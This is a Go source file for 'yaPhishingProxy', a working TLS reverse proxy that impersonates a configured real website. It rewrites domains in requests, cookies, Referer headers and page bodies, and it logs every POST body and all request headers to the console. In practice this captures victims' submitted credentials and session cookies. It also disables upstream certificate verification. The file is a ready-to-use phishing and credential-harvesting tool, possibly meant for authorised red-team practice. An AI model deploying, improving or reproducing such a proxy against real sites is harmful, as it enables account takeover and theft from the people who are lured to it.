package main

/*
Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/chapter3/yaPhishingProxy"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o yaPhishingProxy.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o yaPhishingProxy.exe -ldflags "-w -s" main.go

// Create the TLS keys for the https web server
// openssl genrsa -out server.key 2048
// openssl ecparam -genkey -name secp384r1 -out server.key
// openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365

// Directory structure
// - yaReverseHTTPProxy.bin
// - keys/
// - - server.key
// - - server.crt

// References:
// https://www.youtube.com/watch?v=tWSmUsYLiE4
// https://dev.to/b0r/implement-reverse-proxy-in-gogolang-2cp4

Build a config.json file with the following:
Assumption that the sites are https://.  Do not include the https:// in the URLs
{
	"listeningPort": "443",
	"listeningURL": "example.proxy.local",
	"proxiedURL": "www.original.domain"
	"serverCert": "keys/server.crt"
	"serverKey": "keys/server.key"
}

Note: That if URLs are outside of the source of destination will not be proxied

// Add the following feautres
1. **When running as root be able to choose the user to execute as
2. Built how to build the keys in a commonFunction include in this...
3. Display the port that the server runs as...

*/

import (
	"bytes"
	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
	"compress/gzip"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

type Configuration struct {
	ListeningPort string `json:"listeningPort"`
	ListeningURL  string `json:"listeningURL"`
	ProxiedURL    string `json:"proxiedURL"`
	ServerCert    string `json:"serverCert"`
	ServerKey     string `json:"serverKey"`
}

func main() {
	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	fmt.Println("Loading the following config file: " + *ConfigPtr)
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config Configuration
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	//var err error
	// Without the below line the reverse proxy does not handle TLS correctly
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	// Introduce command line flags to dynamically update the following:
	// - Destination URL
	// - Listening Port

	// Verify the destination server is available
	//dstURL := "https://www.example.internal"
	//dstServerURL, err := url.Parse(dstURL)
	//checkError("Unable to connect to destination URL", err)

	proxy := http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {

		//fmt.Println(w)
		var dstURL string
		//var dstServerURL *url.URL

		if strings.Contains(req.Host, config.ListeningURL) {
			dstURL = "https://" + config.ProxiedURL + req.RequestURI
		} else {
			fmt.Printf("\nUnproxied: %s%s\n\n", req.Host, req.RequestURI)
		}
		fmt.Printf("\n-------\nHost: %s%s\nProxied: %s\nMethod: %s\n-------\n", req.Host, req.RequestURI, dstURL, req.Method)

		var dstServerReq *http.Request
		var dstServerResponse *http.Response

		// Display the requests POST Body
		reqBodyBytes, err := io.ReadAll(req.Body)
		cf.CheckError("Unable to read response body", err, true)
		reqBodyString := string(reqBodyBytes)
		if req.Method == "POST" {
			fmt.Printf("\n--POST Request--\n%s\n--END POST Request---\n\n", reqBodyString)
		}
		if req.Method == "GET" {
			dstServerReq, err = http.NewRequest(req.Method, dstURL, nil)
			cf.CheckError("Unable to generate new request to destination", err, true)
		} else {
			dstServerReq, err = http.NewRequest(req.Method, dstURL, bytes.NewBuffer(reqBodyBytes))
			cf.CheckError("Unable to generate new request to destination", err, true)
		}

		// Print the client side request headers and copy them to the destination server request
		fmt.Printf("\n\n-------\nClient Request Headers copied to Destination Server:\n-------\n")
		for key, values := range req.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)

				if key == "Referer" && strings.Contains(value, config.ListeningURL) {
					//Note this is not URL Encoded
					value = strings.Replace(value, "https://"+config.ListeningURL, "https://"+config.ProxiedURL, -1)
					fmt.Printf("\n*** Modified the Referer header to: %s\n\n", value)
					dstServerReq.Header.Add(key, value)
				} else if key == "Cookie" && strings.Contains(value, config.ListeningURL) {
					// Note the values of the cookie are URL Encoded
					fmt.Println("\n*** Evaluating the cookies and modifying them...")
					value = strings.Replace(value, "https%3A%2F%2F"+config.ListeningURL, "https%3A%2F%2F"+config.ProxiedURL, -1)
					fmt.Printf("Cookie after the change: %s\n\n", value)
					dstServerReq.Header.Add(key, value)
				} else {
					dstServerReq.Header.Add(key, value)
				}
			}
		}

		// Print the headers and copied to the destination server request
		fmt.Printf("\n\n-------\nDestination Request Headers:\n-------\n")
		for key, values := range dstServerReq.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)
				//dstServerReq.Header.Add(key, value)
				//w.Header().Set(key, value)
			}
		}

		dstServerResponse, err = http.DefaultClient.Do(dstServerReq)
		cf.CheckError("Unable to send request to destination", err, true)

		defer dstServerResponse.Body.Close()

		// Print the headers on the reverse proxy side
		// Copy the response headers to the client
		fmt.Printf("\n\n-------\nDestination Server Response Headers:\n-------\n")
		for key, values := range dstServerResponse.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)
				w.Header().Set(key, value)
			}
		}

		// Read the destination server response body
		// If the content-encoding is gzip then you need to decompress the body before reading it
		var responseReader io.ReadCloser
		switch dstServerResponse.Header.Get("Content-Encoding") {
		case "gzip":
			responseReader, err = gzip.NewReader(dstServerResponse.Body)
			defer responseReader.Close()
		default:
			responseReader = dstServerResponse.Body
		}

		bodyBytes, err := io.ReadAll(responseReader)
		cf.CheckError("Unable to read response body", err, true)
		//fmt.Printf("\n\n%s\n\n", bodyBytes)

		//bodyBytes, err := io.ReadAll(dstServerResponse.Body)
		//checkError("Unable to read response body", err)
		bodyString := string(bodyBytes[:])
		//fmt.Printf("\n\n%s\n\n", bodyString)

		// Modify the URLs to use the proxy server - Place the URLs in the hosts file
		bodyString = strings.Replace(bodyString, config.ProxiedURL, config.ListeningURL, -1)

		// Only compress the response body if the header instructs the browser to do it
		// Some of the pictures do not go through if it is not structured this way
		var modifiedBodyBytes []byte
		switch dstServerResponse.Header.Get("Content-Encoding") {
		case "gzip":
			// Due to decompressing the response body from the server to change it, you need to recompress and pass to the client
			var b bytes.Buffer
			gz := gzip.NewWriter(&b)
			gz.Write([]byte(bodyString))
			gz.Close()
			bodyString = b.String()
			modifiedBodyBytes = []byte(bodyString)
		default:
			modifiedBodyBytes = []byte(bodyString)
		}

		w.Header().Set("Content-Length", fmt.Sprint(len(modifiedBodyBytes)))

		// Create a new reader to change the bytes to io.Reader
		readerBodyBytes := bytes.NewReader(modifiedBodyBytes)

		// Return the response to the client")

		// Return the response to the client
		//w.WriteHeader(http.StatusOK)
		//io.Copy(w, dstServerResponse.Body)
		//time.Sleep(time.Second * 2)
		w.WriteHeader(dstServerResponse.StatusCode)
		io.Copy(w, readerBodyBytes)
	})

	//httpsServer := "Yes"
	fmt.Printf("Listening URL: %s\n", config.ListeningURL)
	fmt.Printf("Listening Port: %s\n", config.ListeningPort)
	fmt.Printf("Proxied URL: %s\n", config.ProxiedURL)
	listeningPort := ":" + config.ListeningPort
	//fmt.Print(httpsServer)
	//fmt.Print(listeningPort)
	log.Fatal(http.ListenAndServeTLS(listeningPort, config.ServerCert, config.ServerKey, proxy))

}
